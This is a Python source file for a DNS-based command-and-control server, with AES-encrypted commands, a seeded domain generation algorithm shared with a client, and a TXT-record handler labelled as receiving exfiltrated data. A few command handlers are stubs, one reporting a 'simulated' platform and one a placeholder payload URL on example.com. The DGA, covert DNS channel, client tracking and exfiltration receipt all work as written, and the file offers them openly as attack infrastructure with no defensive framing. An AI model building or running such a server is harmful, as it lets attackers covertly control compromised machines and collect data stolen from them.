from dnslib import DNSRecord, RR, QTYPE, A, TXT
import socket
import logging
import time
import random
import hashlib
from datetime import datetime
from threading import Thread
from crypto import AESCipher

class DnsC2Server:
    def __init__(self, ip='0.0.0.0', port=5353):
        self.ip = ip
        self.port = port
        
        # Crypto setup (same as client)
        self.cipher = AESCipher("master-key-!@#123")
        
        # Domain Generation Algorithm Configuration
        self.DGA_WORDS = ["api", "cdn", "mail", "storage", "cloud", 
                         "download", "assets", "content", "backup", "sync"]
        self.DGA_SEED = "myc2_$7r0ngK3y!"  # Must match client!
        self.DGA_TLD = ".com"
        self.current_domains = self._generate_domains()
        self.domain_update_time = time.time()
        
        # Client tracking -- need to update further!
        self.clients = {}  # {ip: last_seen_timestamp}
        
        # Command handlers
        self.commands = {
            'get_system_info': self._handle_system_info,
            'download': self._handle_download,
            'heartbeat': self._handle_heartbeat,
            'get_domains': self._handle_get_domains
        }
        
        self._setup_logging()
        logging.info("DNS C2 Server initialized with AES+DGA")

    def _setup_logging(self):
        """Configure logging format and handlers"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('c2_server.log'),
                logging.StreamHandler()
            ]
        )

    # Domain Generation Algorithm implementation
    def _generate_domains(self, count=50):
        """Generate domains using time-based DGA"""
        date_str = datetime.now().strftime("%Y%m%d")  # Daily rotation
        base = f"{self.DGA_SEED}{date_str}"
        domains = []
        
        for i in range(count):
            # Deterministic 'random' choice using index as seed
            word = random.Random(i).choice(self.DGA_WORDS)
            # Create hash-based domain
            h = hashlib.sha256(f"{base}{i}{word}".encode()).hexdigest()
            domains.append(f"{word}-{h[:4]}{self.DGA_TLD}")
        
        logging.debug(f"Generated {len(domains)} domains (Sample: {domains[:3]}...)")
        return domains

    def _refresh_domains(self):
        """Rotate domains daily at midnight"""
        now = time.time()
        if now - self.domain_update_time > 86400:  # 24 hours
            self.current_domains = self._generate_domains()
            self.domain_update_time = now
            logging.info("DGA domains rotated")

    def _is_valid_domain(self, domain):
        """Check if queried domain matches current DGA set"""
        self._refresh_domains()
        return any(domain.endswith(d) for d in self.current_domains)

    # Core server functionality
    def start(self):
        """Start the C2 server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.ip, self.port))
        logging.info(f"Server started on {self.ip}:{self.port} | DGA Seed: {self.DGA_SEED}")

        # Start maintenance threads
        Thread(target=self._key_rotation_monitor, daemon=True).start()
        Thread(target=self._client_cleanup, daemon=True).start()

        # Main request loop
        while True:
            try:
                data, addr = sock.recvfrom(512)
                self._handle_request(sock, data, addr)
            except Exception as e:
                logging.error(f"Request error: {e}")

    def _key_rotation_monitor(self):
        """Log key rotation events"""
        while True:
            time.sleep(60)
            if self.cipher._rotate_key():
                logging.info(f"Crypto: Rotated to key v{self.cipher.key_version}")

    def _client_cleanup(self):
        """Remove inactive clients (>24h)"""
        while True:
            time.sleep(3600)
            cutoff = time.time() - 86400
            inactive = [ip for ip, t in self.clients.items() if t < cutoff]
            for ip in inactive:
                del self.clients[ip]
                logging.info(f"Removed inactive client: {ip}")

    def _handle_request(self, sock, data, addr):
        """Process incoming DNS queries"""
        try:
            request = DNSRecord.parse(data)
            qname = str(request.q.qname).lower()
            qtype = request.q.qtype
            client_ip = addr[0]

            # Update client last seen
            self.clients[client_ip] = time.time()

            # Validate against DGA first
            if not self._is_valid_domain(qname):
                logging.warning(f"Invalid domain from {client_ip}: {qname}")
                return

            # Prepare response
            response = request.reply()
            if qtype == QTYPE.A:
                self._handle_a_query(qname, response, client_ip)
            elif qtype == QTYPE.TXT:
                self._handle_txt_query(qname, response, client_ip)

            sock.sendto(response.pack(), addr)
        except Exception as e:
            logging.error(f"Request handling failed: {e}")

    # DNS query handling
    def _handle_a_query(self, qname, response, client_ip):
        """Process command requests"""
        parts = qname.split('.')
        if len(parts) > 3 and parts[0] == 'cmd':
            try:
                encrypted_cmd = '.'.join(parts[1:-2])
                command = self.cipher.decrypt(encrypted_cmd)
                logging.info(f"CMD from {client_ip}: {command}")

                if command in self.commands:
                    self.commands[command]()  
                    response.add_answer(RR(qname, QTYPE.A, rdata=A("192.168.1.1"), ttl=10))
                else:
                    response.add_answer(RR(qname, QTYPE.A, rdata=A("10.0.0.1"), ttl=10))
            except Exception as e:
                logging.warning(f"Command failed from {client_ip}: {e}")
                response.add_answer(RR(qname, QTYPE.A, rdata=A("1.1.1.1"), ttl=60))

    def _handle_txt_query(self, qname, response, client_ip):
        """Process data exfiltration"""
        parts = qname.split('.')
        if len(parts) > 3 and parts[0] == 'data':
            try:
                encrypted_data = '.'.join(parts[1:-2])
                data = self.cipher.decrypt(encrypted_data)
                logging.info(f"EXFIL from {client_ip}: {data[:50]}...")
                response.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("ACK"), ttl=10))
            except Exception as e:
                logging.warning(f"Exfil failed from {client_ip}: {e}")
                response.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("ERROR"), ttl=10))

    # COMMAND HANDLERS -
    def _handle_system_info(self):
        return {"status": "success", "data": {"platform": "simulated"}}

    def _handle_download(self):
        return {"status": "queued", "url": "http://example.com/payload"}

    def _handle_heartbeat(self):
        return {"status": "alive"}

    def _handle_get_domains(self):
        """Debug command to check DGA"""
        return {"domains": self.current_domains[:5]}

if __name__ == "__main__":
    try:
        server = DnsC2Server(port=5353)
        server.start()
    except KeyboardInterrupt:
        logging.info("Server shutdown requested")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
